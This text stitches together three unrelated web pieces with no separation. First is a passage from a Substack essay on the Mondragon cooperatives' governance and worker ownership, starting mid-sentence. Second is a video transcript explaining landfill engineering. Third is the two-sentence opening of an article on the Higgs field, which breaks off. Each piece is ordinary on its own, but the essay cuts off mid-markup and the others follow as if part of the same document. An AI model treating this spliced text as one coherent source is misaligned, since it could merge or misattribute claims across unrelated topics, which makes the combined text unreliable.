separate cooperatives with separate democracies.&nbsp;</p><p>Every year, workers (internally called the “General Assembly”) meet to review prior years’ management, decide how to allocate profits or losses, and approve annual accounts. They vote their board of directors into office (called the “Governing Council”) who, in turn, vote their CEOs into office (called “General Managers”). General Managers hire their own executive team and make periodic reports to the Governing Council who can confer or revoke their powers as necessary.&nbsp;Positions of leadership serve a renewable four-year term and will be removed from office if they aren’t doing a good job.&nbsp;</p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F35874922-aaf7-4810-a5d0-7ad3c49b45ac_1019x552.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F35874922-aaf7-4810-a5d0-7ad3c49b45ac_1019x552.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F35874922-aaf7-4810-a5d0-7ad3c49b45ac_1019x552.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F35874922-aaf7-4810-a5d0-7ad3c49b45ac_1019x552.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F35874922-aaf7-4810-a5d0-7ad3c49b45ac_1019x552.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F35874922-aaf7-4810-a5d0-7ad3c49b45ac_1019x552.png" width="1019" height="552" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/35874922-aaf7-4810-a5d0-7ad3c49b45ac_1019x552.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:552,&quot;width&quot;:1019,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F35874922-aaf7-4810-a5d0-7ad3c49b45ac_1019x552.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F35874922-aaf7-4810-a5d0-7ad3c49b45ac_1019x552.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F35874922-aaf7-4810-a5d0-7ad3c49b45ac_1019x552.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2F35874922-aaf7-4810-a5d0-7ad3c49b45ac_1019x552.png 1456w" sizes="100vw" loading="lazy"></picture></div></a></figure></div><p>The parent company works similarly: “Congress” is an assembly of representatives from every cooperative. They vote for the “Standing Committee,” who appoints the “President,” the head of Mondragon.&nbsp;</p><p>Each cooperative pays for workers’ education at Mondragon University, itself a cooperative in the Mondragon network. There’s even a bootcamp program for General Managers—a sort of entrepreneurial “CEO school”—where executives have the support they need to run financially successful companies, and have the opportunity to learn from executives at other cooperatives who have done so.</p><p><span>Together, they’ve even formed a constitution: The “Rules of Congress” outlines the articles of their organization and includes the corporation’s strategic plan—or “socio-business policy”—which is prepared and voted on every four years. During the time of my visit, Congress was getting ready to meet about the organization's plans for 2025 to 2028. (Reminiscent of my essay: “</span><a href="https://www.elysian.press/p/we-need-to-get-rid-of-politicians" rel="">We should vote for plans, not politicians</a><span>.”)</span></p><p>Each democratically-run organization is supported by the larger democratically-run Mondragon. Workers at Mondragon cooperatives are guaranteed a job and an income. They are taken care of when they can’t work, provided with universal healthcare if they get sick, receive universal education that trains them for any job, and are provided a pension when they retire. There is no unemployment, no poverty. No one is sitting around collecting handouts from everyone else, they are all actively working and contributing to the system.&nbsp;</p><p>And unlike governments, the cooperative provides all of these things with profits, not by taxing income.&nbsp;</p><p>Workers at Mondragon still get income taxes taken out of their paychecks, and cooperatives still pay corporate taxes, but at a much lower rate than traditional companies. And those tax dollars go to the Basque Country, itself an autonomous region that uses them (plus VAT taxes on goods and services) to fund things the corporation can’t: like infrastructure and elementary education.</p><p>Mondragon’s democracy was, in many ways, a precursor to the ones that would eventually come to Spain. The organization was in business for 19 years by the time Franco died in 1975 and Spain started transitioning to a democracy. The Basque Country was established as an autonomous region in 1979 and they elected their first parliament in 1980.&nbsp;</p><p><span>As the largest employer in the region, Mondragon </span><em>is</em><span> the Basque Country, and the Basque Country </span><em>is</em><span> Mondragon. “When they try to change the co-op law, they call us,” Lorenzo says. And when Mondragon wants to change cooperative law, they call the Basque Country.</span></p><p>To this day, the two work reciprocally for the benefit of the region. Workers can now choose between Mondragon or Basque healthcare, and they have access to Spanish social security programs along with their Mondragon pensions. Lagun Aro fluctuates to fill in the gaps of government as needed, and the government fluctuates to supply the needs of the region. The Basque government also contributes a quota (called a “cupo”) to the Spanish government to fund defense, foreign affairs, and larger national projects that benefit the whole country.&nbsp;</p><p><span>In this way, Mondragon acts as a self-governing city-state within a larger state and nation. Each individual cooperative has the most authority over workers’ lives, even as layers of Basque and Spanish governments provide larger, but more lightweight methods of governance for the greater whole. The structure works a lot like the one I outline in my essay: “</span><a href="https://www.elysian.press/p/city-states-should-choose-federal-governments" rel="">Decouple federal government from nation-states</a><span>.”</span></p><p>“We work at three levels: With the Basque Government, with the Spanish Government, and with the European Government,” Lorenzo says. “Our aims are global, we want to create wealth, jobs, and develop a better strategy. Every government loves that idea.”</p><p>If the model is a good one, detractors say it can’t be replicated outside of the Basque Country, and there’s some truth to that. Once employees are here they tend to be lifers, but getting them here has proved a real challenge. Lorenzo says they hire about 30% of their workforce from Mondragon University, but they need to hire more engineers than they can find in the Basque Country, and that means recruiting abroad.&nbsp;</p><p>This is logistically challenging, but also culturally. “In the US, I have to buy a million-dollar house and $100,000 car, and have 80,000 products,” Lorenzo says. “The capitalist world is built on selfishness, individualism, being number one. We can’t attract the kind of hard talent that wants to make money and be number one.”</p><p><span>Living expenses are much lower in the Basque Country than they are in the US, but so are salaries and that can be a tough sell. Dreams of becoming a billionaire are nonexistent. When I published an</span><a href="https://www.elysian.press/p/employee-ownership/" rel=""> essay</a><span> about employee ownership, one person commented: “Why the hell should anybody still start a company and want to become an entrepreneur when he needs to give stocks to every employee he hires? This is completely stupid. If you want to become rich, become an entrepreneur.”&nbsp;</span></p><p>Mondragon is a different mindset. “We feel that our collective ‘us’ is more important than ‘me,’ but they are more independent, individualistic people,” Lorenzo says. “So it takes some time to really convince people that this system is worthwhile. They see sometimes that we are a compromise for a full life, so we have to think in new ways, adapt our system.”</p><p><span>In Europe, cooperatives like Mondragon grew up alongside consumer co-ops like John Lewis &amp; Partners in the UK. The Alta Deba region of the Basque Country isn’t so different from the </span><a href="https://www.lowimpact.org/posts/why-is-the-co-operative-movement-so-successful-in-emilia-romagna-with-matt-hancock-no-not-that-one" rel="">Emilia Romagna</a><span> region in Italy where cooperatives like SACMI and Manutencoop are highly networked with one another and cooperatives make up </span><a href="https://www.yesmagazine.org/economy/2016/07/05/the-italian-place-where-co-ops-drive-the-economy-and-most-people-are-members" rel="">a third of the region’s GDP</a><span>. In Brazil, </span><a href="https://en.wikipedia.org/wiki/Unimed_(organization)" rel="">Unimed</a><span> recently became the largest worker cooperative in the world by revenue (Mondragon is second), providing an alternative to capital-based health systems.&nbsp;</span></p><div><figure><a target="_blank" href="https://substackcdn.com/image/fetch/f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe947fe81-147e-42bb-b967-1f14d6af5511_1018x331.png" data-component-name="Image2ToDOM" rel=""><div><picture><source type="image/webp" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe947fe81-147e-42bb-b967-1f14d6af5511_1018x331.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe947fe81-147e-42bb-b967-1f14d6af5511_1018x331.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe947fe81-147e-42bb-b967-1f14d6af5511_1018x331.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_webp,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe947fe81-147e-42bb-b967-1f14d6af5511_1018x331.png 1456w" sizes="100vw"><img src="https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe947fe81-147e-42bb-b967-1f14d6af5511_1018x331.png" width="1018" height="331" data-attrs="{&quot;src&quot;:&quot;https://substack-post-media.s3.amazonaws.com/public/images/e947fe81-147e-42bb-b967-1f14d6af5511_1018x331.png&quot;,&quot;srcNoWatermark&quot;:null,&quot;fullscreen&quot;:null,&quot;imageSize&quot;:null,&quot;height&quot;:331,&quot;width&quot;:1018,&quot;resizeWidth&quot;:null,&quot;bytes&quot;:null,&quot;alt&quot;:null,&quot;title&quot;:null,&quot;type&quot;:null,&quot;href&quot;:null,&quot;belowTheFold&quot;:true,&quot;topImage&quot;:false,&quot;internalRedirect&quot;:null}" alt="" srcset="https://substackcdn.com/image/fetch/w_424,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe947fe81-147e-42bb-b967-1f14d6af5511_1018x331.png 424w, https://substackcdn.com/image/fetch/w_848,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe947fe81-147e-42bb-b967-1f14d6af5511_1018x331.png 848w, https://substackcdn.com/image/fetch/w_1272,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe947fe81-147e-42bb-b967-1f14d6af5511_1018x331.png 1272w, https://substackcdn.com/image/fetch/w_1456,c_limit,f_auto,q_auto:good,fl_progressive:steep/https%3A%2F%2Fsubstack-post-media.s3.amazonaws.com%2Fpublic%2Fimages%2Fe947fe81-147e-42bb-b967-1f14d6af5511_1018x331.png 1456w" sizes="100vw" loading="lazy"></picture></div></a><figcaption><span>Five largest worker cooperatives in the world by 2021 revenue. </span><a href="https://monitor.coop/" rel="">Source</a></figcaption></figure></div><p>While, in most of the world, capitalism grew up alongside the Rockefellers and the Carnegies of the world, cooperatives in Europe and South America were creating a much better form of it, but it’s a stark contrast. Try convincing the Jeff Bezos’ of the world to start a cooperative. Conversely, try convincing a Mondragon manager to keep the stock for themselves and become a Jeff Bezos. The two models come from two very different worlds.</p><p>“I think it is possible to replicate, but it requires people who believe in the model and know how to replicate it,” Lorenzo says. “Before he opened the first co-op, [Arizmendiarrieta] had spent nearly 15 years preaching. He was educating, he was creating mindsets. It’s not a copy-and-paste issue, I don’t think it’s that easy.”&nbsp;</p><p><span>If it’s education we need, Lorenzo admits Mondragon has fallen short. “We’ve been very good at </span><em>doing</em><span>, but not very good at </span><em>telling</em><span> these last 50 years. That’s why I’m sure your article will give us a good position.”&nbsp;</span></p><p>Even as a journalist, information on the company has not been readily available. The books I read on the subject are only available at company headquarters. The biography of its founder is only in Spanish. Knowledge about the company is limited to educational materials, a sparse Wikipedia page, and a spattering of articles that extol the benefits of cooperatives without really explaining how they work. Members of the media are only granted access if they can attend one of the company’s in-person media days which are hosted once a month. I had to buy a plane ticket, rent a car, drive six hours from the Barcelona airport, and rent a hotel nearby to get a meeting—a large expense for an independent journalist.</p><p>It makes sense—cooperatives are businesses first and cooperatives second. They have to compete with other companies on the market, and win, to make a profit. Only then can they use that profit more equitably. “We bought the chairs in this room from a company that’s a cooperative,” Lorenzo illustrated, “but we got them because they were the best price and quality, not because they were from a cooperative.”</p><p><span>Mondragon can’t afford to spend all their time proselytizing. What founders </span><em>do </em><span>come to study the model might put it into practice, but if they only create one cooperative that benefits 100 workers, Lorenzo says they miss the point. They need to create a network of them to fund new startups, create new jobs, provide social services, and transfer workers between companies. It is the combination of cooperatives that makes the whole thing self-sustaining, not the individual ones.&nbsp;</span></p><p><span>There are very few of those. </span><a href="https://www.cicopa.coop/wp-content/uploads/2018/01/Cooperatives-and-Employment-Second-Global-Report-2017.pdf" rel="">As of 2017</a><span>, there were only 11.1 million worker-owners globally, out of </span><a href="https://data.worldbank.org/indicator/SL.TLF.TOTL.IN" rel="">3.39 billion</a><span> total workers—that’s only 0.33% of the working population, and it’s not growing.</span><span><a data-component-name="FootnoteAnchorToDOM" id="footnote-anchor-2-147917881" href="https://www.elysian.press/p/mondragon-as-the-new-city-state#footnote-2-147917881" target="_self" rel="">2</a></span><span> Employee ownership is rare, democratically-run cooperatives are rarer still, and a whole network of them? Mondragon and Unimed are really the only ones.&nbsp;</span></p><p>Because of this, Lorenzo thinks we won’t create a world of cooperatives as the founders once imagined. “I think this is fiction because at the end of the day, there are forces in the world that are difficult to scale up.”&nbsp;</p><p><span>If cooperatives are still a niche movement, the movement to make capitalism work better for more people is </span><em>massive</em><span>.&nbsp;</span></p><p><span>As is well documented in </span><a href="https://amzn.to/3MxeEMJ" rel="">Thomas Piketty</a><span>’s work, inequality has been on the rise since the 1970s when wealth taxes were skewered and executives started getting paid in stocks. Those who owned capital (such as real estate, stocks, and bonds), got much richer, and because they got much richer, they bought more capital. Return on capital exceeds the rate of economic growth, meaning those with significant wealth saw their fortunes grow faster than the economy, the rest didn’t.</span></p><p><span>A widening gulf now threatens to become much wider and the result is outrage. When the rich can afford mega-yachts and a well-paid software engineer can’t afford a house, we see a rise in the same “</span><a href="https://www.theguardian.com/politics/2021/sep/20/eat-the-rich-why-millennials-and-generation-z-have-turned-their-backs-on-capitalism" rel="">eat the rich</a><span>” mentality that once cost Marie Antoinette her head. In the US, </span><a href="https://www.pewresearch.org/politics/2022/09/19/modest-declines-in-positive-views-of-socialism-and-capitalism-in-u-s/" rel="">only 40%</a><span> of those ages 18 to 29 view capitalism positively. Democrats </span><a href="https://news.gallup.com/poll/240725/democrats-positive-socialism-capitalism.aspx" rel="">think better of socialism than capitalism</a><span>, </span><a href="https://iea.org.uk/media/67-per-cent-of-young-brits-want-a-socialist-economic-system-finds-new-poll/" rel="">67% of young Brits</a><span> do too. According to a </span><a href="https://onlinelibrary.wiley.com/doi/10.1111/ecaf.12591" rel="">Wiley’s worldwide survey</a><span>, most countries are now anti-capitalist. Their top reasons why are all related to inequality.</span></p><p>The most popular proposed solution is a wealth tax, but that could be enacted by one president only to be thrown out by the next one (or used to fund military endeavors rather than social ones). More extreme options involve eradicating capitalism altogether by returning to subsistence farming and bartering or giving the government control of the economy—we’ve tried both options and neither fared better for humanity than our current capitalist system.</p><p>One option, however, has.&nbsp;</p><p>Mondragon provides us with a successful, working model. It’s not throwing out capitalism, it’s creating a better form of it. It is still private individuals who own capital, but more of us become owners. Companies are still getting wealthy, but that wealth is put to better use. Rather than create a few rich people only to tax them on the back end, we allow everyone to get richer on the front end. We don’t get there through revolution, just evolution. Instead of descending into “late capitalism” we start building “mature capitalism.”&nbsp;</p><p><span>We need to channel all of that anti-capitalist sentiment into a better capitalist solution, and we can start with what is already working. Most worker cooperatives are concentrated in Asia (</span><a href="https://www.cicopa.coop/wp-content/uploads/2018/01/Cooperatives-and-Employment-Second-Global-Report-2017.pdf" rel="">8,573,775 worker-owners</a><span>) and Europe (</span><a href="https://www.cicopa.coop/wp-content/uploads/2018/01/Cooperatives-and-Employment-Second-Global-Report-2017.pdf" rel="">1,554,687 worker-owners</a><span>) where cooperatives are a more widely accepted business model and offer an alternative democratic solution where there are less democratic governments—we should build more of those. Though there are significantly fewer in the Americas (982,285) and Africa (37,836), recent policy changes have incentivized </span><a href="https://www.elysian.press/p/employee-ownership" rel="">employee ownership</a><span> in the US, Canada, and the UK, as well as transferred ownership to </span><a href="https://www.tamela.co.za/rethinking-employee-share-ownership-plans-in-south-africa/" rel="">307,000 workers at 118 firms</a><span> in South Africa—we should build more of those too.&nbsp;</span></p><p><span>Around the world, we need founders to start new cooperatives and </span><a href="https://www.elysian.press/p/founders-can-make-millions-selling-to-workers" rel="">sell existing companies to employees</a><span>—we need our governments to incentivize both options. </span><a href="https://www.elysian.press/p/founders-can-make-millions-selling-to-workers" rel="">It’s in their best interest</a><span> to do so! If we can create more employee-owned companies, maybe we can slowly start edging out the shareholder-owned ones. If we can create a critical mass of them, maybe we can even start federating them together as Mondragon once did.&nbsp;If we can create more democratically-run companies, maybe then we won’t need our countries as much. </span></p><p>With Mondragon-like clusters of profitable, democratically-run businesses, what we currently call government could be sufficiently stripped down to infrastructure and militaristic support.&nbsp;</p><p>Anarchist, socialist, and capitalist thinkers alike have gotten behind this solution, with sci-fi authors imagining a world of cooperative city-states. “It’s funny that they use our ideas at all kinds of levels,” Lorenzo says. “Socialist, anarchist, capitalist—at the end our aims are very legitimate. We want to increase wealth, create jobs, and try to develop, in a way, a better world.”</p><p>I still think we could get there—that we could create a world of cooperatives. It is at least one of our options. The future is long and capitalism is still new. It is still transforming into something better and evolving into what it will become. Humans are demanding a fix to inequality and companies like Mondragon are providing a successful blueprint we can follow.&nbsp;</p><p>In a 2021 book about the founding of Mondragon, authors Armin Isasti and Isabel Uribe thought Arizmendiarrieta’s vision wasn’t yet done: “We need to imagine the future, consider alternatives, form new collectives, and be able to see beyond ourselves. We need to return to utopian thinking; we need people who have the courage to be utopians as José María Arizmendiarrieta was. Far from being satisfied with completing Arizmedi’s utopia, let us continue to yearn after a world in which imagination and hope are alive and active.”</p><p>Arizmendiarrieta himself believed that vision was the first step. “Most of what has been achieved through conscious and responsible human effort has been, in first instance, a beautiful ideal,” he said. “And only that.”</p><p>So long as we can imagine that beautiful ideal, maybe we can even create it.&nbsp;</p><p data-attrs="{&quot;url&quot;:&quot;https://www.elysian.press/p/mondragon-as-the-new-city-state/comments&quot;,&quot;text&quot;:&quot;Leave a comment&quot;,&quot;action&quot;:null,&quot;class&quot;:null}" data-component-name="ButtonCreateButton"><a href="https://www.elysian.press/p/mondragon-as-the-new-city-state/comments" rel=""><span>Leave a comment</span></a></p><p><span>This is the next installment of </span><a href="https://www.elysian.press/t/capitalism" rel="">my capitalism series</a><span> and how we can make this system work better for humanity.

  <p><em>[Note that this article is a transcript of the video embedded above.]</em></p><p>This is the Puente Hills Landfill outside of Los Angeles, California. The first truckload of trash was dumped here in 1957, and the trucks just kept coming. For more than five decades, if you threw something away in LA County, there’s a good chance it’s buried somewhere inside this mountain of waste. At its peak, Puente Hills was accepting around four million tons of trash every year, making it one of the largest landfills in the country. It closed in 2013, creating a time capsule of everyday life and consumption patterns over a span of 56 years. But Puente Hills is also a time capsule of landfill engineering itself. In 1976, right in the middle of its lifespan, sweeping federal regulations changed how we deal with solid waste forever.</p><p>You probably don’t think too much about where your trash goes, and that’s kind of the whole point of the solid waste industry: to make sure you have the ability to throw something away without it having a serious negative consequence on the environment or public health. There’s a larger conversation to be had about the amount of waste we generate and how much of it can be recycled or reused, but there is always going to be stuff that just doesn’t hold enough value to be kept. Trash is an inescapable element of the human condition. And, I think you’re going to be surprised how complicated that really is. When Puente Hills opened in the 50s, a landfill was pretty much just a hole in the ground where trash was dumped. By the time it closed, landfills were highly engineered holes where trash gets dumped. And I have a scale model of a landfill in the garage to show you how it all works. I’m Grady, and this is Practical Engineering.</p><p>There are lots of kinds of waste in this crazy world, but one of the biggest sources is just you and me throwing stuff in the trash. The technical term is municipal solid waste, since its collection is usually coordinated at the city level. There are a lot of ways to manage it once collected, but the most common by far is disposal in a landfill. And, one of the biggest parts of landfill engineering is just deciding where to put one in the first place. The main goal of a landfill is to maximize the volume of waste that can be stored there while minimizing the cost and the environmental impacts too, which turns choosing a suitable site into a giant geometry problem. </p><p>Digging a hole sounds like an obvious choice, but consider this: digging a hole is expensive, and not digging a hole is free. There are costs of excavating tons and tons of soil just to get it out of the way so it can be replaced with trash and costs of hauling away all that soil (since your goal is to maximize the volume on the site). Plus, you have to avoid the water table, any unsuitable geology, and the challenges of building and working deep below the surface of the earth. That’s why most landfills mostly build up into what sanitation professionals call the “air space.” Looking upward, it may seem like the sky is the limit, but anyone who’s built a tower of anything, let alone trash, knows better. The waste pile gets less stable as its height increases, requiring shallower slopes. And the pressures at the bottom go up too, which can lead to settlement and damage of facilities. Plus, there are visual impacts. The bigger the garbage heap, the bigger the eyesore, and people are only willing to look at a landfill so tall. </p><p>They can’t be too close to airports, because they attract birds that can interfere with planes. And they can’t be too close to homes, parks, playgrounds, and other places people congregate for obvious reasons. Of course, there’s floodplains and wildlife habitat to avoid as well. And you don’t just need a place to put the trash. You also need a scale house to weigh the trucks coming in and out, a shop and storage for the equipment, and sometimes a place for ordinary citizens to drop stuff off. Finally, you need a spot that can handle the huge increase in truck traffic coming and going, practically nonstop. Pretty much, if you can get a college degree in it, it’s going to come into play when siting a landfill: geology, geography, politics, archaeology, public relations, biology, every kind of engineering, and lot more.</p><p>But once you have your landfill, you can’t just start dumping trash. Let me show you why with a demonstration with some help from my shop assistants. I have my hole dug, and we’ll start adding some trash. So far, no major problems. But eventually, it’s going to rain. And you can’t immediately see the issue. Granted, this is more of a flood than a drizzle, but it gets the point across. All that water is going to filter through the garbage to the bottom of the hole, and, eventually, into the underlying soil. It might go without saying, but I’m going to say it anyway: We really don’t want garbage juice percolating into our soils. Mainly because it can contaminate sources of groundwater, but also because it can migrate well beyond the limits of the landfill, causing all sorts of environmental troubles. So, modern landfills use a bottom liner to keep waste separate from the underlying soils. Often this consists of a thick sheet of plastic, carefully tested and welded together into an impermeable membrane. Even the area between the plastic welds is tested using air pressure to make sure there are no leaks. Another option is thick clay soil compacted to create a watertight layer. In many cases, the two options are combined, so you end up with this intricate structure of different impermeable layers stacked together.</p><p>Maybe you still see a problem with this solution on its own. Now when it rains, the landfill just fills up with water. This causes issues with stability and settlement. It causes garbage to decompose more quickly, leading to odor and temperature problems. Plus, you just can’t work on top. There’s no way for trucks to unload trash on top of a garbage swamp. So we need a way to get the garbage juice out, without letting it flow into the soil below. By the way, garbage juice isn’t a technical term. It’s actually called leachate, so I’ll use that from here on out. And all modern landfills have sophisticated leachate collection systems to keep the waste as dry as possible and avoid the issues I mentioned. Usually, this consists of a system of perforated pipes covered in a layer of sand, draining to sumps, and eventually leading out of the waste.</p><p>I built a little leachate collection system in my model landfill using a small tube so you can see this in action. Now my clay bathtub has a drain. When the rain comes, the water that makes its way into the waste is able to flow out of the landfill, keeping it from becoming a swampy mess. This is a little simplified compared to a real landfill. I’ve made a video all about French Drains, which is much closer to what a leachate collection system consists of if you want to learn more after this. Obviously, in my example, the leachate system has to penetrate the bottom liner, which can be a potential source of leaks. So these penetrations are sealed really carefully in the real world, or the collection system just uses pumps and risers that run up the slope of the landfill to the top, so no penetration system is necessary.</p><p>Of course, now you have a stream of leachate you have to deal with. Actually, leachate management is one of the biggest costs of running a facility like this. Some landfills send it off to a treatment plant that can clean it up. Some have ways to treat it on-site with settling ponds, evaporation, biological treatment, and even plants that can consume and convert landfill leachate into waste that’s easier to dispose of (maybe even back into the landfill itself).</p><p>Finally, the bottom of our landfill has all the necessary pieces, but the work doesn’t stop there. Remember that volume is everything in a landfill. For as much effort goes into finding a location and building the infrastructure, it’s essential that we get the most trash in here as possible. You probably know this, but municipal garbage just isn’t that dense. Maybe you’ve had to smash a few more bags in the can because you missed the collection one week. If so, you know there’s usually a lot of room for densification. The trucks that collect garbage usually have a way to compact it to make more room in the box before needing to be emptied. But once the trash is at the landfill, there’s still an opportunity for compaction. Landfills often use massive roller compactors with enormous teeth and giant blades to grade out and compress waste and get as much as possible into the site. It saves money, and it’s good stewardship of the space. But density isn’t the only challenge with day-to-day operations.</p><p>Despite what you’ve heard, landfills are kind of gross. I mean, that’s their whole point is to accept the stuff we don’t want to put anywhere else. But putting it all in one place creates a lot of problems: pests, odors, windblown waste, fires, birds, and more. So to mitigate some of that, most places require that the garbage be covered up at the end of every day. This “daily cover” can take a lot of forms. The basic approach is just to put a layer of soil over the top of the working face at the end of the day. </p><p>When I do this in my model, you get a sense of the problem. All that clean daily cover is taking up precious space in the landfill. One option is to trim it back off each morning before trucks start arriving, but that’s a sisyphean task of just moving tons and tons of soil around each day. Other alternatives for daily cover are tarps, or just holding back certain types of waste that are more inert like foundry sand, foam, paper, and shredded tires. They’re going in anyway, so you might as well use them on top to cover the more disagreeable stuff overnight. Those alternatives can also help avoid leachate getting perched within the waste, encouraging it to continue downward to the collection system.</p><p>Ideally, a landfill will last for decades, slowly filling up by packing as much waste as possible. Throughout the course of operating a landfill, there’s constant testing of groundwater, surface water, leachate, air quality and more to make sure they’re not exceeding limits. Landfills are usually built in smaller cells so you don’t have to manage this huge area of waste all at once. A cell fills up, you put soil over the top (called interim cover), and start a new one within the landfill. But eventually, you reach the top of the airspace, and the landfill reaches the end of its useful life. And closing a landfill is not an easy job. Of course, you have to cover all that waste up, creating a mountainous sealed tomb of garbage. That final cover has to keep water out, to reduce the volume of leachate you’re having to collect and treat over time. But it also has to keep the garbage in, and not just the garbage itself, but anything else that comes with it like smells and leachate and pests. And it has to do it basically forever. So, just like the bottom liner, the final cover over a landfill is usually a system of multiple layers, including compacted soil, membranes, and fabrics. And then you have to get the grass to grow, to protect the soil from erosion and damage over time. I don’t have time to wait for grass to grow in my demo, so I’m cheating a little bit.</p><p>But the fun isn’t quite over yet. The waste may be sealed up, but that doesn’t mean it’s inert. In fact, there’s a lot of chemistry and biology happening inside a landfill, and a lot of those reactions generate gases like methane and hydrogen sulfide that can create pressure, heat, smells, greenhouse effects in the atmosphere, and the potential for explosions. So, one of the steps in landfill closure is to install wells that can collect the gases from the waste. Usually, these consist of vertical pipes connected to a blower that constantly draws air to a collection point. There’s a lot that goes into these systems too. You can’t pull too hard, or you might draw oxygen into the landfill, changing the reactions and microbiological processes, and creating a potential for a fire within the waste. Plus the gas includes a lot of humidity, so managing condensation creates another liquid stream that has to be collected and treated. Once it’s collected, the landfill gas can be flared, combusting it into less environmentally harmful constituents. Another option is to put it to beneficial use to create heat or even electricity. The Puente Hills landfill I showed earlier has a gas-to-energy facility that’s been running since 1987, and even though the landfill is now closed, it currently provides enough electricity to power around 70,000 homes.</p><p>Once a landfill is closed, there’s not a lot you can do with it after that. It’s a big, sealed up, mountain of trash, after all. Owners are generally required to look after a closed landfill for at least 30 years afterwards, inspecting for leaks, monitoring the air and water, and repairing any damage. Those costs have to be built into the rates they charge, since there’s not a lot of benefit (or revenue) after closure. But, with all that open space and carefully-maintained landscaping, one option that many landfill operators are trying out is parks. And I love this idea. They say, “We’re willing to put our money where our mouth is and invite the public to spend time here, to enjoy this place that used to be, you know, one of the least enjoyable places you can imagine.” Puente Hills in California has big plans, including trails on the slopes, biking, slides, gardens and more. It looks like it will be a really nice place to visit when it’s done. And it also puts the whole concept of landfills in perspective.</p><p>Of course, we have a lot of room for improvement in how we think about and manage solid waste in this world. Landfills seem like an environmental blight, but really, properly designed ones play a huge role in making sure waste products don’t end up in our soil or air or water. It’s not possible to landfill waste everywhere. Many places are too densely populated or just don’t have enough space. But where they are, the environmental impacts are relatively small. Just consider the resources that go into them. I pay about 20 dollars a month, probably a little on the low end of the national average, and that buys me 64 gallons (about a quarter of a cubic meter) of space in a municipal landfill per week. Of course, I don’t fill the can every week, and that trash gets compacted. But still, do that for a decade, and your 20 bucks a month has paid for the volume of a modest apartment. It’s covered the cost of building the lining and collection systems, the environmental monitoring, the daily operations, the closure, the gas collection, and the maintenance for at least three decades afterwards and for your trash to stay there effectively forever. It’s (almost) free real estate, not that you’d want to live there. But my point is: landfills are a surprisingly low-impact way to manage solid waste in a lot of cases. I hope the future is a utopia where all the stuff we make maintains its beneficial value forever, but for now, I am thankful for the sanitary engineers and the other professions involved in safely and economically dealing with our trash so we don’t have to.</p>

<div id="readability-page-1" class="page"><div data-role="selectable">
    <p>The discovery of the Higgs boson at the Large Hadron Collider in 2012 confirmed what we particle physicists had long suspected: that there is a field permeating the cosmos that generates the masses of elementary particles. Unfortunately, physicists have found it challenging to explain to everyone else how this so-called Higgs field accomplishes its mighty task.</p>
<p>A common approach has been to tell a tall tale. Here’s one version:</p>
